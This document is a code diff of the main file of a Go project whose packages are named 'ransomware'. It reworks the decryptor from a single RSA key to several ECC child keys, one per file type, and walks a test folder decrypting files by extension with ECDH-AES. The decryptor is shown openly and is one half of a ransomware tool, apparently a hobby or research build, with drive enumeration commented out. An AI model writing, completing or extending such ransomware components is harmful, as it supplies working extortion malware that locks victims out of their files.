@@ -1,15 +1,15 @@
 package main
 
 import (
-	"crypto/rsa"
 	"fmt"
 	"io/fs"
 	"os"
 	"path/filepath"
 	"ransomware/encryption"
-	"ransomware/encryption/rsaLib"
+	"ransomware/encryption/eccLib"
 	"ransomware/io"
 	"ransomware/utils"
+	"strconv"
 	"strings"
 	"sync"
 )
@@ -20,15 +20,15 @@ var (
 )
 
 func main() {
-	privKey, err := rsaLib.ReadRSAPrivateKey("cPrivateKey.pem")
-	if err != nil {
-		panic(err)
-	}
+
+	var privKeys []*eccLib.ExtendedPrivateKey
+
+	privKeys = readKeys()
 
 	currentDirectory, _ := os.Getwd()
 	dir := string(filepath.Dir(currentDirectory) + "/testFolder")
 
-	decryptFiles(dir, privKey)
+	decryptFiles(dir, privKeys)
 
 	// drives := io.GetDrives()
 	// for _, drive := range drives {
@@ -37,7 +37,26 @@ func main() {
 
 }
 
-func decryptFiles(dirPath string, cPrivKey *rsa.PrivateKey) {
+func readKeys() []*eccLib.ExtendedPrivateKey {
+
+	var childsNumber uint16 = utils.FileTypeLenght
+	var i uint16
+	var err error
+
+	var privChildKeys = make([]*eccLib.ExtendedPrivateKey, childsNumber)
+
+	for i = 0; i < childsNumber; i++ {
+		path := "privateKey" + strconv.FormatInt(int64(i+1), 10) + ".pem"
+		privChildKeys[i], err = eccLib.ReadExtPrivateKey(path)
+		if err != nil {
+			fmt.Println("Failed to read key", path, err)
+		}
+
+	}
+	return privChildKeys
+}
+
+func decryptFiles(dirPath string, privKeys []*eccLib.ExtendedPrivateKey) {
 
 	var ext string
 	waitGroup.Add(1)
@@ -59,13 +78,13 @@ func decryptFiles(dirPath string, cPrivKey *rsa.PrivateKey) {
 					if err != nil {
 						return err
 					}
+
 					split := strings.Split(path, ".")
 					if len(split) >= 2 {
 						ext = split[len(split)-2]
 						filesToVisit <- io.File{Info: info, Path: path, Extension: ext}
 					}
 				}
-
 			}
 			return nil
 		})
@@ -77,10 +96,15 @@ func decryptFiles(dirPath string, cPrivKey *rsa.PrivateKey) {
 	waitGroup.Add(1)
 	go func() {
 		for file := range filesToVisit {
-			err := io.DecryptFile(&file, encryption.RSAAESDecrypt, cPrivKey)
-			if err != nil {
-				fmt.Println("Error decrypting file", file.Path, "Error:", err)
+
+			fileType, mapContains := utils.FileType[file.Extension]
+			if mapContains && privKeys[fileType] != nil {
+				err := io.DecryptFile(&file, encryption.ECDHAESDecrypt, &privKeys[fileType].PrivateKey)
+				if err != nil {
+					fmt.Println("Error decrypting file", file.Path, "Error:", err)
+				}
 			}
+
 		}
 		defer waitGroup.Done()
 	}()
